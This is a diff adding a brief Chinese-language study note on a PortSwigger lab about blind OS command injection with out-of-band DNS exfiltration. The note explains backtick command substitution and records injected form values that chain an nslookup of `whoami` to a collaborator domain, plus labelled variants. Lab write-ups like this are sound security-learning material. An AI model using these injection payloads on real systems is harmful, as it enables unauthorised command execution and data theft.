@@ -1,0 +1,24 @@
+靶场地址: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
+
+=====新知识1: 关于命令替换=====
+ `target` : 这不是引号昂,是左上角的那个东西
+用于命令的替换
+有点类似 py 的 f"{}"
+
+###
+进入靶场
+构造 x||+nslookup+`whoami`.域名||qq@qq.com -> 图1
+随后在 collaborator中找到用户名  -> 图2
+solved
+
+-----
+我后续尝试了增加标记:
+x||+nslookup+mark-`whoami`.域名||qq@qq.com
+可行 -> 图3
+我又尝试增加 : 可惜没有成功
+x||+nslookup+"Start".`whoami`.域名||qq@qq.com
+可行 -> 图4
+说到底还是 : 的事情
+
+-----
+后续: DNS标签就是不能有 冒号:
